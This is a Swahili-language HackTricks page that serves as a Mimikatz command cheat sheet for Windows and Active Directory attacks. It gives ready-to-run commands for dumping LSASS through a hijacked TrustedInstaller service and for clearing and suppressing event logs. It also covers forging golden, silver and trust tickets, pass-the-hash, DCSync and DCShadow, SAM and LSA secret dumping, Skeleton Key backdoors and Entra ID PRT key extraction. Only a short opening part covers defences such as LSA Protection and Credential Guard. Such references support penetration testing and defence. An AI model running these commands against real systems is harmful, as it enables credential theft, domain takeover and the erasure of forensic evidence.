# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Ukurasa huu umetokana na mmoja kwenye [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Angalia wa awali kwa maelezo zaidi!<sup>[[3]](#references)</sup>

## LM na maandishi wazi kwenye kumbukumbu

Kuanzia Windows 8.1 na Windows Server 2012 R2, hatua muhimu zimewekwa ili kulinda dhidi ya wizi wa credentials:

- **LM hashes na nywila za maandishi wazi** hazihifadhiwi tena kwenye kumbukumbu ili kuimarisha usalama. Mpangilio maalum wa registry, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, lazima usanidiwe kwa thamani ya DWORD `0` ili kuzima Digest Authentication na kuhakikisha kuwa nywila za "maandishi wazi" hazihifadhiwi kwenye cache ya LSASS.

- **LSA Protection** huanzishwa ili kulinda mchakato wa Local Security Authority (LSA) dhidi ya kusomwa kwa kumbukumbu na kuingizwa kwa code bila idhini. Hili hufanywa kwa kuweka LSASS kama mchakato uliolindwa. Kuwasha LSA Protection kunahusisha:
  1. Kurekebisha registry katika _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kwa kuweka `RunAsPPL` kuwa `dword:00000001`.
  2. Kutekeleza Group Policy Object (GPO) inayotekeleza mabadiliko haya ya registry kwenye vifaa vinavyodhibitiwa.

Licha ya ulinzi huu, zana kama Mimikatz zinaweza kukwepa LSA Protection kwa kutumia drivers maalum, ingawa vitendo hivyo vinaweza kurekodiwa kwenye event logs.

Kwenye workstation za kisasa, hili ni muhimu zaidi kwa sababu **Credential Guard huwashwa kwa chaguomsingi kwenye mifumo mingi ya Windows 11 22H2+ na Windows Server 2025 iliyojiunga na domain, isiyo DC**, ilhali **LSASS-as-PPL huwashwa kwa chaguomsingi kwenye usakinishaji mpya wa Windows 11 22H2+**. Kiutendaji, hii inamaanisha kuwa `sekurlsa::logonpasswords` mara nyingi hutoa taarifa chache kuliko ilivyotarajiwa na mbinu za zamani, na operators wanazidi kutumia **offline minidumps**, **uchimbaji wa funguo za Kerberos (`sekurlsa::ekeys`)**, au **modules zinazohusu CloudAP/PRT**. Kwa upande wa ulinzi, angalia [Windows credentials protections](credentials-protections.md).

### Kukabiliana na Kuondolewa kwa SeDebugPrivilege

Kwa kawaida, wasimamizi wana SeDebugPrivilege, inayowawezesha kutatua hitilafu za programu. Ruhusa hii inaweza kuzuiwa ili kuzuia memory dumps zisizoidhinishwa, mbinu ya kawaida inayotumiwa na washambuliaji kuchukua credentials kutoka kwenye kumbukumbu. Hata hivyo, hata ruhusa hii ikiondolewa, akaunti ya TrustedInstaller bado inaweza kutengeneza memory dumps kwa kutumia usanidi maalum wa service:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Hii inaruhusu dumping ya memory ya `lsass.exe` kwenye faili, ambalo linaweza kuchanganuliwa kwenye mfumo mwingine ili kutoa credentials:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Chaguo za Mimikatz

Kuharibu kumbukumbu za matukio katika Mimikatz kunahusisha vitendo viwili vikuu: kufuta kumbukumbu za matukio na kurekebisha huduma ya Event ili kuzuia kurekodiwa kwa matukio mapya. Hapa chini kuna amri za kutekeleza vitendo hivi:

#### Kufuta Kumbukumbu za Matukio

Mimikatz ina amri ya `event::clear`. Hutumia API ya Windows ya kufuta kumbukumbu ya matukio ya classic iliyochaguliwa. Chaguo-msingi ni `Security`; `/log:` huchagua kumbukumbu nyingine, na mtumiaji anayetekeleza amri anahitaji ruhusa za kuifuta. Hii si sawa na `event::drop`, ambayo hujaribu kuzuia rekodi mpya kuandikwa.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Kipengele cha Majaribio: Kurekebisha Event Service

- **Amri**: `event::drop`
- Amri hii ya majaribio imeundwa kubadilisha tabia ya Event Logging Service, na hivyo kuizuia kurekodi matukio mapya.
- Mfano: `mimikatz "privilege::debug" "event::drop" exit`

- Amri ya `privilege::debug` huhakikisha kuwa Mimikatz ina ruhusa zinazohitajika za kurekebisha huduma za mfumo.
- Kisha amri ya `event::drop` hurekebisha Event Logging service.

### Mashambulizi ya Tiketi za Kerberos

Tumia amri zilizo hapa chini kama vikumbusho vya haraka vya sintaksia. Kurasa maalum za [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), na [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) zina maelezo ya hivi karibuni kuhusu AES/PAC/opsec.

### Kuunda Golden Ticket

Golden Ticket huruhusu kuiga utambulisho na kupata ufikiaji katika kikoa chote. Amri na vigezo muhimu:

- Amri: `kerberos::golden`
- Vigezo:
  - `/domain`: Jina la kikoa.
  - `/sid`: Security Identifier (SID) ya kikoa.
  - `/user`: Jina la mtumiaji wa kuiga.
  - `/krbtgt`: NTLM hash ya akaunti ya huduma ya KDC ya kikoa.
  - `/ptt`: Huingiza tiketi moja kwa moja kwenye kumbukumbu.
  - `/ticket`: Huhifadhi tiketi kwa matumizi ya baadaye.

Mfano:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Kutengeneza Silver Ticket

Silver Tickets hutoa ufikiaji wa huduma mahususi. Amri na vigezo muhimu:

- Amri: Inafanana na Golden Ticket, lakini hulenga huduma mahususi.
- Vigezo:
  - `/service`: Huduma ya kulenga (kwa mfano, cifs, http).
  - Vigezo vingine vinafanana na vya Golden Ticket.

Mfano:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Uundaji wa Trust Ticket

Trust Tickets hutumika kufikia rasilimali katika vikoa tofauti kwa kutumia mahusiano ya uaminifu. Amri na vigezo muhimu:

- Amri: Inafanana na Golden Ticket, lakini hutumika kwa mahusiano ya uaminifu.
- Vigezo:
  - `/target`: FQDN ya kikoa lengwa.
  - `/rc4`: Hashi ya NTLM ya akaunti ya uaminifu.

Mfano:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Amri za Ziada za Kerberos

- **Kuorodhesha Tiketi**:

  - Amri: `kerberos::list`
  - Huorodhesha tiketi zote za Kerberos za session ya mtumiaji wa sasa.

- **Pass the Cache**: `kerberos::ptc` husoma faili ya MIT/Heimdal `.ccache`, **si** faili ya `.kirbi`. Toa njia ya faili kama hoja ya nafasi: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt` husoma faili ya `.kirbi` au saraka yenye faili za aina hiyo. Pia hupokea njia kama hoja ya nafasi, si `/ticket:`: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Tazama [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md) kwa mtiririko mpana wa kazi.<sup>[[6]](#references)</sup>

- **Kufuta Tiketi**:
  - Amri: `kerberos::purge`
  - Huondoa tiketi zote za Kerberos kwenye session.
  - Ni muhimu kabla ya kutumia amri za urekebishaji wa tiketi ili kuepuka migongano.

### Over-Pass-the-Hash / Pass-the-Key

Ikiwa `RC4` imezimwa au haitegemeki, Mimikatz inaweza kuweka **funguo za AES128/AES256 Kerberos** kwenye session ya sasa ya kuingia badala ya kutumia hash ya NT pekee. Kwa kawaida, hii inafaa zaidi kwa domain za kisasa kuliko kuchukulia `sekurlsa::pth` kuwa ya NTLM pekee.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` hutumia tena mchakato wa sasa badala ya kuanzisha console mpya. Hii ni rahisi unapotaka kuendesha mara moja vitu kama `lsadump::dcsync` katika muktadha huohuo.

### Kubadilisha Active Directory

- **DCShadow**: Fanya mashine ijifanye DC kwa muda ili kubadilisha vitu vya AD. Tazama [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Jifanye DC ili kuomba data ya nywila. Tazama [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Ufikiaji wa vitambulisho

- **LSADUMP::LSA**: Toa vitambulisho kutoka LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Jifanye DC kwa kutumia data ya nywila ya akaunti ya kompyuta.

  - _Hakuna amri maalum ya NetSync iliyotolewa katika muktadha asilia._

- **LSADUMP::SAM**: Fikia hifadhidata ya SAM ya ndani.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Fumbua siri zilizohifadhiwa kwenye registry.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Weka NTLM hash mpya kwa mtumiaji.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Pata maelezo ya uthibitishaji wa trust.
  - `mimikatz "lsadump::trust" exit`

### Vitambulisho vya cloud / Entra ID

Kwenye host za **Entra ID** au zilizounganishwa kwa njia ya **hybrid**, `sekurlsa::cloudap` inaweza kufichua data ya **Primary Refresh Token (PRT)** iliyohifadhiwa kwenye cache ya LSASS. `ProofOfPossesionKey.KeyValue` yake ni blob ya session-key iliyolindwa na DPAPI, si key ambayo tayari imefumbuliwa.<sup>[[7]](#references)[[8]](#references)</sup> Ili kutumia `/unprotect`, endesha `dpapi::cloudapkd` kama `SYSTEM` (kwa mfano, `token::elevate` kutoka kwenye kipindi cha Mimikatz kilichopandishwa mamlaka), au jaza kwanza cache ya key ya Mimikatz kwa kutumia `sekurlsa::dpapi`. `privilege::debug` pekee haibadilishi muktadha wa mpigaji wa DPAPI.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Nakili `Context` na `Derived Key` zinazolingana kutoka kwenye amri ya kwanza hadi ya pili; Mimikatz hutengeneza context mpya ikiwa hakuna iliyotolewa. Hata kwa key inayolindwa na TPM, Mimikatz inaweza kupata signing key kwa kutumia TPM kwenye kifaa asili. Si lazima clear key i-exportiwe, lakini matokeo yaliyofaulu ya derived-key yanaweza kusaini cookie ya browser.<sup>[[7]](#references)</sup>

Mfuatano wa PRT pekee hautoshi kwa sababu Microsoft Entra huhitaji uthibitisho wa umiliki wa session key inayohusishwa nayo.<sup>[[9]](#references)</sup> Tazama [urejeshaji wa key ya DPAPI](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) kwa chaguo nyingine za master-key na [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) kwa mnyororo wa upande wa cloud.

### Mengineyo

- **MISC::Skeleton**: Ingiza backdoor kwenye LSASS kwenye DC.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Kuongeza Haki

- **PRIVILEGE::Backup**: Pata haki za backup.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Pata haki za debug.
  - `mimikatz "privilege::debug" exit`

### Kumwaga Credentials

- **SEKURLSA::LogonPasswords**: Onyesha credentials za watumiaji walioingia.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Toa Kerberos tickets kutoka kwenye memory.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Udanganyifu wa SID na Token

- **SID::add/modify**: Badilisha SID na SIDHistory.

  - Ongeza: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Badilisha: _Hakuna amri mahususi ya kubadilisha katika muktadha wa awali._

- **TOKEN::Elevate**: Jifanye mtumiaji mwingine kwa kutumia tokens.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Ruhusu vipindi vingi vya RDP.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Orodhesha vipindi vya TS/RDP.
  - _Hakuna amri mahususi iliyotolewa kwa TS::Sessions katika muktadha wa awali._

### Vault

- Toa nywila kutoka Windows Vault.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [Zana za The Hacker – modules za Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB na Entra ID: Kutana na mtiririko wako mpya wa cache](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Marejeo ya amri za Mimikatz](https://adsecurity.org/?page_id=1821)
- [4] [Chanzo cha module ya event ya Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Chanzo cha module ya ccache ya Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Chanzo cha module ya Kerberos ya Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Utekelezaji wa CloudAP DPAPI wa Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Kuchunguza zaidi Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Ulinzi wa Primary Refresh Token wa Microsoft Entra](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
